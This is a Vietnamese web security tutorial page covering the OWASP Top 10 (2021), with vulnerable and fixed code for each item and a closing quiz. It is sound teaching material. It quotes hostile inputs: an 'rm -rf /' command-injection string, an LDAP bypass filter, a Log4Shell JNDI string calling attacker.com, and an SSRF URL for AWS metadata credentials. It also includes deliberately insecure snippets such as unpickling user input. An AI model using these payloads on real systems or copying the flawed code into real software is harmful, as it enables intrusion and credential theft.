---
id: 03-owasp-top-10
title: 7.3 OWASP Top 10 (2021) chi tiết
sidebar_position: 3
description: "10 lớp lỗ hổng web phổ biến nhất theo OWASP 2021, mỗi mục có mô tả, code minh hoạ, exploit example, mitigation cụ thể."
---

# 7.3 OWASP Top 10 (2021) chi tiết

> **Tóm tắt một dòng**: OWASP Top 10 là danh sách 10 lớp lỗ hổng web phổ biến nhất, được cộng đồng OWASP công bố và cập nhật mỗi 3-4 năm. Phiên bản 2021 là phiên bản mới nhất tại thời điểm này. Bài này đi qua từng mục với mô tả, code minh hoạ, ví dụ tấn công thực tế và cách phòng tránh cụ thể.

## Vì sao OWASP Top 10 quan trọng?

Hầu hết security audit, security questionnaire của customer, và compliance framework (PCI-DSS, SOC 2) đều reference OWASP Top 10. Khi bạn nói "đã review OWASP Top 10 cho ứng dụng" và có evidence, đó là một checkpoint mặc định mà người đối diện hiểu được.

OWASP Top 10 cũng là **giáo trình thực dụng** nhất cho web security. Nắm vững 10 mục này = chống được 90% attack web phổ biến.

Bài này dựa trên phiên bản **2021**. Phiên bản trước (2017) khác đôi chút về thứ tự và tên gọi.

## A01:2021 - Broken Access Control

**Định nghĩa**: User truy cập resource hoặc thực hiện action mà họ không có quyền.

**Tại sao nguy hiểm**: trực tiếp lộ data, sửa data, leo thang quyền. OWASP nói 94% application họ test có ít nhất một lỗi access control.

### Ví dụ 1: IDOR (Insecure Direct Object Reference)

```python
# SAI
@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    order = db.query(Order).get(order_id)
    return order.to_json()
```

User A có order_id=123. Đổi URL thành `/api/orders/124` → thấy order của user B.

**Fix**:

```python
# ĐÚNG
@app.route('/api/orders/<int:order_id>')
@require_auth
def get_order(order_id):
    order = db.query(Order).get(order_id)
    if order.user_id != current_user.id:
        return jsonify({'error': 'Forbidden'}), 403
    return order.to_json()
```

Mọi endpoint trả về object phải check ownership.

### Ví dụ 2: Forced browsing

User normal truy cập `/admin/users` (page admin), không có check role.

**Fix**: middleware check role:

```python
@app.before_request
def check_admin():
    if request.path.startswith('/admin/') and not current_user.is_admin:
        abort(403)
```

### Ví dụ 3: JWT bypass

```python
# SAI
def verify_jwt(token):
    payload = jwt.decode(token, verify=False)
    return payload
```

`verify=False` skip signature check. Attacker tự tạo JWT bất kỳ.

**Fix**: `jwt.decode(token, SECRET, algorithms=['HS256'])`, luôn verify.

### Mitigation chung

- Mọi endpoint check authorization explicit.
- Deny by default, allow by exception.
- Server-side check (không tin tưởng client-side hide UI).
- Log mọi access deny để detect attack.
- Test với 2 user account khác nhau, đảm bảo data isolation.

## A02:2021 - Cryptographic Failures

**Định nghĩa**: Failure liên quan đến cryptography làm lộ data nhạy cảm.

Phiên bản trước (2017) tên là "Sensitive Data Exposure", focus vào hệ quả. 2021 đổi tên để focus vào nguyên nhân (sai crypto).

### Ví dụ 1: Plain password

```python
# SAI
db.save(user_id, password=password)
```

Database breach = mọi password lộ. User dùng cùng password ở site khác cũng bị compromise.

**Fix**: bcrypt như đã thấy ở [bài 7.2](./02-cryptography-basics).

### Ví dụ 2: MD5/SHA-1 password hash

```python
# SAI
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()
```

MD5 broken. Rainbow table lớn có sẵn. Crack hash trong giây.

**Fix**: bcrypt/argon2.

### Ví dụ 3: TLS cũ

Server vẫn accept TLS 1.0/1.1. Attack POODLE, BEAST.

**Fix**: chỉ TLS 1.2+, tốt nhất 1.3-only. HSTS header.

### Ví dụ 4: Hardcoded key

```python
# SAI
SECRET_KEY = "my_secret_2024"
```

Source code leak (GitHub public, ex-employee) = key lộ.

**Fix**: secret manager (AWS Secrets Manager, Vault), env var inject runtime.

### Mitigation chung

- Encrypt data nhạy cảm at rest và in transit.
- Dùng thuật toán modern (bài 7.2 recommendation).
- KHÔNG self-implement crypto.
- Rotate key định kỳ.
- HSM cho key critical.

## A03:2021 - Injection

**Định nghĩa**: Dữ liệu không tin cậy được gửi tới interpreter (SQL, OS, LDAP, XPath, NoSQL) như một phần của command/query.

Đã chi tiết ở [bài 1.4](../01-introduction/04-web-vulnerabilities). Tổng quan ngắn:

### SQL Injection

```python
# SAI
query = f"SELECT * FROM users WHERE name = '{name}'"

# ĐÚNG
query = "SELECT * FROM users WHERE name = %s"
cur.execute(query, (name,))
```

### Command Injection

```python
# SAI
os.system(f"ping {user_input}")

# ĐÚNG
subprocess.run(["ping", user_input], shell=False)
```

`shell=False` cực kỳ quan trọng. Với `shell=True`, `user_input = "x; rm -rf /"` thành disaster.

### LDAP Injection

```python
# SAI
filter = f"(uid={user_input})"
```

User input `*)(uid=*` bypass auth.

**Fix**: escape LDAP special chars hoặc dùng parameterized API.

### XSS (đã chi tiết bài 1.4)

Reflected, Stored, DOM-based. Fix: encoding theo context, CSP, HttpOnly cookie.

### Mitigation chung

- Dùng API parameterized cho mọi interpreter.
- Validate input theo whitelist (allowed chars).
- Escape output theo context.
- ORM tốt thường tự safe.

## A04:2021 - Insecure Design

**Định nghĩa**: Lỗ hổng nằm ở **thiết kế**, không phải implementation. Code có thể đúng bug-free nhưng kiến trúc sai.

Đây là loại khó phát hiện tự động.

### Ví dụ 1: Thiếu rate limiting

API `/api/reset-password` cho phép request unlimited. Attacker spam reset email để DoS user.

**Fix**: rate limit (express-rate-limit, Cloudflare).

### Ví dụ 2: Business logic flaw

E-commerce cho phép apply nhiều coupon code đồng thời. Combine 2 coupon "50% off" thành "100% off" = miễn phí.

**Fix**: business rule trong code: tối đa 1 coupon, hoặc max discount %.

### Ví dụ 3: Workflow bypass

Checkout flow: cart → payment → confirm. Attacker skip payment, gọi `confirm` endpoint trực tiếp = nhận hàng không trả tiền.

**Fix**: state machine: confirm chỉ cho phép sau payment success.

### Mitigation chung

- Threat modeling từ đầu (STRIDE).
- Secure design pattern.
- Tests for business logic, không chỉ unit test function.
- Code review focus design.

## A05:2021 - Security Misconfiguration

**Định nghĩa**: Default config, incomplete config, open cloud storage.

### Ví dụ 1: Debug mode in production

```python
# SAI in production
app.run(debug=True)
```

Debug mode = stack trace lộ ra user, code execution qua Werkzeug debugger.

**Fix**: env-based config, `debug=False` trong prod.

### Ví dụ 2: Default password

Router/IoT mặc định `admin/admin`. Hàng triệu thiết bị bị scan và compromise.

**Fix**: force change password lần đầu, generate unique credential per device.

### Ví dụ 3: S3 bucket public

```bash
aws s3api put-bucket-acl --bucket my-bucket --acl public-read
```

Bucket public → mọi object đọc được. Hàng nghìn data leak qua AWS S3 misconfig.

**Fix**: bucket private mặc định, presigned URL cho download.

### Ví dụ 4: Unnecessary feature enabled

PHP có `allow_url_include = On` cho phép include URL → RCE.

**Fix**: disable mọi feature không dùng.

### Mitigation chung

- Secure baseline config (CIS Benchmark).
- Automation: terraform/ansible.
- Scan misconfig: AWS Config, Prowler, Trivy.
- Hardened image cho container.

## A06:2021 - Vulnerable and Outdated Components

**Định nghĩa**: Dùng library, framework, OS có CVE biết trước.

### Ví dụ 1: Log4Shell (CVE-2021-44228)

Log4j 2.x trước 2.15: `${jndi:ldap://attacker.com/exploit}` trong bất kỳ string log → RCE.

Hàng triệu Java app compromise. Patch khẩn cấp suốt tuần.

### Ví dụ 2: dependency cũ

```json
"express": "4.16.0"
```

Có nhiều CVE từ năm 2018. Update lên 4.18+.

### Mitigation chung

- **Dependabot/Renovate**: auto PR khi có CVE.
- **`npm audit`, `pip-audit`, `gosec`**: scan trong CI.
- **SBOM (Software Bill of Materials)**: track mọi dependency.
- **Container scan**: Trivy, Grype, Snyk.
- Update định kỳ, không đợi đến critical CVE.

## A07:2021 - Identification and Authentication Failures

**Định nghĩa**: Sai trong identity, authentication, session management.

### Ví dụ 1: Weak password policy

App cho phép password "123456". 80% user dùng password yếu = dễ brute force.

**Fix**: require min 8 chars, check against breached password list (haveibeenpwned API).

### Ví dụ 2: No MFA

Account admin chỉ password. Phishing 1 lần = mất account.

**Fix**: bắt buộc MFA cho admin (FIDO2 key tốt nhất, TOTP OK, SMS yếu).

### Ví dụ 3: Session fixation

```python
# SAI
def login(username, password):
    if check(username, password):
        session['user'] = username
        # session ID không regenerate
```

Attacker fix session ID trước login, sau khi user login với session đó, attacker có cùng session.

**Fix**: regenerate session ID sau login thành công.

### Ví dụ 4: Predictable session token

```python
# SAI
token = str(uuid.uuid1())   # UUID v1 = timestamp + MAC
```

UUID v1 không random, attacker đoán được.

**Fix**: `secrets.token_urlsafe(32)` (Python) hoặc `crypto.randomBytes(32)` (Node).

### Mitigation chung

- Dùng auth provider chuẩn (Auth0, Cognito, Clerk).
- MFA bắt buộc cho admin.
- Password policy + breach check.
- Account lockout sau N fail.
- Session: secure, HttpOnly, SameSite=Strict, regenerate after login.

## A08:2021 - Software and Data Integrity Failures

**Định nghĩa**: Code và infrastructure không verify integrity. Bao gồm CI/CD pipeline, plugin/library auto-update, serialization bug.

### Ví dụ 1: Auto-update không verify

```python
# SAI
plugin = download("http://plugin.com/latest.js")
exec(plugin)
```

Plugin author compromise = mọi user chạy malicious code.

**Fix**: verify signature, sandbox plugin.

### Ví dụ 2: Insecure deserialization

```python
# SAI
import pickle
data = pickle.loads(user_input)
```

Pickle có thể execute arbitrary code khi deserialize. Attacker craft input → RCE.

**Fix**: dùng JSON cho data format. Nếu cần serialize object, dùng schema validation (msgpack + Pydantic).

### Ví dụ 3: CI/CD compromise

Trojan trong CI/CD pipeline → malicious binary commit và sign. SolarWinds 2020 là ví dụ điển hình.

**Fix**:
- CI/CD secret minimal scope.
- SLSA framework cho supply chain security.
- Reproducible build.
- Sigstore for signing.

### Mitigation chung

- Verify digital signature cho mọi update.
- Code signing với HSM-protected key.
- Sigstore cho open source.
- SBOM kèm signed manifest.

## A09:2021 - Security Logging and Monitoring Failures

**Định nghĩa**: Không có log đủ để detect/respond breach.

### Ví dụ 1: Log thiếu

Login fail không log. Brute force không bị detect.

**Fix**: log mọi auth event, authorization deny, admin action.

### Ví dụ 2: Log không centralize

Mỗi server log riêng. Khi cần investigate, phải SSH từng server. Chậm.

**Fix**: log centralize (ELK, Splunk, CloudWatch).

### Ví dụ 3: Log sensitive data

```python
# SAI
logger.info(f"Login attempt: user={user}, password={password}")
```

Password log = breach.

**Fix**: structured logging với redaction (pino, winston).

### Ví dụ 4: Không có alert

Có log nhưng không có alert. Anomaly không được human notice.

**Fix**: SIEM (Splunk, ELK, Sumo Logic) + alert rule cho pattern (10 fail login/min, admin action ngoài giờ).

### Mitigation chung

- Log: auth event, authz, admin action, security event.
- Centralize: ELK, Splunk, CloudWatch.
- Retention: 1 năm minimum.
- Alert: real-time cho anomaly.
- Tabletop exercise mỗi quý.

## A10:2021 - Server-Side Request Forgery (SSRF)

**Định nghĩa**: Server fetch URL từ user input mà không validate, có thể truy cập internal resource.

### Ví dụ kinh điển: AWS metadata service

```python
# SAI: webhook endpoint
@app.route('/webhook')
def webhook():
    url = request.args.get('url')
    response = requests.get(url)
    return response.text
```

Attacker gửi `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`. Server fetch AWS metadata endpoint, trả credential. Capital One breach 2019 chính là SSRF + AWS metadata.

**Fix 1**: Whitelist domain:

```python
ALLOWED_DOMAINS = ['api.partner.com', 'cdn.example.com']
def webhook():
    url = request.args.get('url')
    domain = urlparse(url).hostname
    if domain not in ALLOWED_DOMAINS:
        return jsonify({'error': 'domain not allowed'}), 400
    response = requests.get(url)
```

**Fix 2**: Block internal IP range:

```python
import ipaddress
def is_internal(host):
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except ValueError:
        return True
```

**Fix 3**: AWS IMDSv2 (token-based metadata, immune to SSRF GET).

### Mitigation chung

- Network segmentation: app không cần access metadata service.
- Egress filtering.
- IMDSv2 trên AWS.
- Validate URL whitelist domain + block private IP.

## Tổng kết: 10 quy tắc nhỏ

| # | Lỗ hổng | Nguyên tắc fix 1 dòng |
|---|---|---|
| A01 | Broken Access Control | Check authorization mọi endpoint, server-side |
| A02 | Cryptographic Failures | bcrypt password, AES-GCM data, TLS 1.3 |
| A03 | Injection | Parameterized query everywhere |
| A04 | Insecure Design | Threat model từ đầu, rate limit, business rule |
| A05 | Misconfig | Secure baseline, scan misconfig |
| A06 | Vulnerable Components | Dependabot + dependency scan trong CI |
| A07 | Auth Failures | MFA, breach check password, regenerate session |
| A08 | Integrity Failures | Verify signature, không pickle, SLSA |
| A09 | Logging Failures | Log + centralize + alert |
| A10 | SSRF | Whitelist domain + block internal IP + IMDSv2 |

Áp dụng 10 nguyên tắc này đủ chống 90% web attack thực tế.

## Tham khảo bổ sung

- [OWASP Top 10 (2021) chính thức](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/): chi tiết mỗi mục.
- [OWASP ASVS (Application Security Verification Standard)](https://owasp.org/www-project-application-security-verification-standard/): checklist comprehensive hơn (250+ check).

## Mini-quiz

<details>
<summary>Q1. IDOR là gì? Cho ví dụ và cách fix.</summary>

**IDOR (Insecure Direct Object Reference)**: endpoint trả về object dựa trên ID từ user input mà không check ownership.

Ví dụ:

```python
# Bug
@app.route('/api/orders/<id>')
def get(id):
    return Order.get(id).to_json()
```

User A có order ID 100. Đổi URL thành ID 101 → thấy order user B.

**Fix**: check ownership:

```python
@app.route('/api/orders/<id>')
def get(id):
    order = Order.get(id)
    if order.user_id != current_user.id:
        abort(403)
    return order.to_json()
```

Hoặc tốt hơn: query với owner filter:

```python
order = Order.query.filter_by(id=id, user_id=current_user.id).first_or_404()
```
</details>

<details>
<summary>Q2. Capital One 2019 breach là SSRF type. Mô tả chuỗi attack.</summary>

1. **Recon**: attacker scan tìm Capital One web app có vulnerable endpoint (WAF rule misconfig).
2. **SSRF**: gửi request có URL `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]` qua vulnerable endpoint.
3. **Server fetch metadata**: AWS EC2 instance metadata service trả về temporary AWS credential (access key, secret, session token).
4. **Exfiltrate**: attacker dùng credential, list S3 bucket, download data (100M record).
5. **Detection lag**: phát hiện sau ~4 tháng, qua tip from external researcher.

**Root cause**: WAF misconfig (A05) + SSRF (A10) + IAM role over-permissioned (A01).

**Fix sau breach**:
- AWS phát hành IMDSv2 (require session token, không phải GET đơn giản).
- WAF rule update.
- IAM role principle of least privilege review.

Lesson: defense in depth thiếu một layer (IMDSv1 + over-permissive IAM) đủ để toàn bộ system compromise.
</details>

<details>
<summary>Q3. Vì sao auto-update không verify signature là bug A08?</summary>

A08 là "Integrity Failures". Auto-update từ remote source mà không verify signature = trust completely "channel" (network, server cung cấp).

Threat scenarios:
- **Supply chain attack**: attacker compromise update server, serve malicious binary. User auto-update = run malware. Ví dụ NotPetya (M.E.Doc accounting software update).
- **MITM attack**: nếu update qua HTTP (no TLS) hoặc TLS cert invalid bypass, attacker swap binary.
- **DNS hijack**: attacker control DNS, redirect update server → malware.

**Fix**:

1. **Code signing**: publisher sign binary với private key (HSM). Update client verify với public key embed trong app.
2. **Sigstore** for open source: transparency log, easier than self-signing.
3. **SLSA (Supply chain Levels for Software Artifacts)**: framework toàn diện cho supply chain security.
4. **Reproducible build**: third party có thể verify binary build từ source code công khai.

Ví dụ Linux package manager (apt, yum): mỗi package signed by maintainer, manager verify trước install. Đây là model an toàn.
</details>

---

**Tiếp theo**: [7.4 CBMC Tutorial](./04-cbmc-tutorial)
